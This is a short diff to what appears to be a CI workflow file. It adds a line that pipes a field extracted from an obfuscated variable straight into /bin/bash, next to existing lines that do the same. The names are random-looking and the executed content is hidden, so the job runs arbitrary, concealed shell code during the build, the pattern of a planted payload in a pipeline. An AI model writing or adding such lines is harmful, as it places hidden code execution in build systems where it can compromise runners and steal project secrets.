@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$nw553" | jq -r .fl0189 | /bin/bash
           echo $qqu2835 | jq -r .sdw80615 | /bin/bash
           echo $quy6 | jq -r .nutv993 | /bin/bash
+          printf '%s' "$sp9141" | jq -r .jqyl9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
